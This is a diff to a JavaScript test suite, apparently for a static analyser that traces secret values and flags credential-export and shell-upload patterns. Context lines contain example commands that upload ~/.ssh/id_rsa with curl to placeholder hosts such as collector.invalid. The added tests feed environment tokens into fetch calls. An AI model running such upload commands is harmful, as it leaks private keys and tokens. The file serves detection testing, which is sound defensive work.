@@ -333,3 +333,58 @@ test('shell upload detection distinguishes executable curl arguments from quoted
   for (const source of ["echo 'curl -T ~/.ssh/id_rsa https://collector.invalid'", "# curl -T ~/.ssh/id_rsa x",
     "curl -T ~/.ssh/id_rsa.pub https://service.invalid", "curl --data-raw @~/.ssh/id_rsa https://service.invalid"]) assert.deepEqual(shellUploadHints(source), []);
 });
+
+test('read-only branch results retain sensitive values and callable captures', () => {
+  for (const selection of [
+    'return flag ? secret : "public";',
+    'if (flag) return secret; else return "public";',
+    'return flag ? (() => secret) : (() => "public");'
+  ]) {
+    const call = selection.includes('=>') ? 'select()()' : 'select()';
+    const source = `const secret=process.env.TEST_TOKEN; function select(flag){${selection}} fetch('/api',{body:${call}});`;
+    assert.ok(hints(source).some(h => h.kind === 'credential-export'), source);
+  }
+});
+
+test('dormant read-only bodies still isolate writes in parameter defaults and nested declarations', () => {
+  for (const declaration of [
+    'function dormant(value = (state.value="public")){ return value; }',
+    'function dormant({value = (state.value="public")} = {}){ return value; }',
+    'function dormant(value = clear()){ return value; }',
+    'function dormant(){ function nested(){state.value="public";} return nested; }'
+  ]) {
+    const result = createFlowAnalysis([{ path: 'index.js', content:
+      `const state={value:process.env.TEST_TOKEN}; function clear(){state.value="public";} ${declaration} module.exports=state.value;` }]).analyze('index.js');
+    assert.equal(result.status, 'parsed', declaration);
+    assert.equal(result.exports.bits & 1, 1, declaration);
+  }
+});
+
+test('large read-only API declarations remain modeled with private local bindings', () => {
+  const declarations = Array.from({length: 1200}, (_, i) =>
+    `function read${i}(value){const local=value; if (unknown) return local; return "public";}`).join('\n');
+  const result = createFlowAnalysis([{path:'index.js', content:
+    `${declarations}\nmodule.exports=read1199(process.env.TEST_TOKEN);`}]).analyze('index.js');
+  assert.equal(result.status, 'parsed');
+  assert.equal(result.exports.bits & 1, 1);
+});
+
+test('dormant control-flow joins preserve exported aliases to captured state', () => {
+  for (const body of [
+    'if(flag){const local=state.value;}',
+    'if(flag){function local(){return state.value;}}',
+    'if(flag){let local;}',
+    'while(flag){state.value;}',
+    'for(;flag;){state.value;}',
+    'for(const key in state){state.value;}',
+    'for(const value of [state]){state.value;}',
+    'do{state.value;}while(flag);',
+    'try{state.value;}catch(error){state.value;}',
+    'switch(flag){case true:state.value;break;default:state.value;}'
+  ]) {
+    const result = createFlowAnalysis([{path:'index.js',content:
+      `const state={value:"public"}; module.exports=state; function read(){${body}} state.value=process.env.TEST_TOKEN;`}]).analyze('index.js');
+    assert.equal(result.status,'parsed',body);
+    assert.equal(result.exports.props.get('value').bits & 1,1,body);
+  }
+});
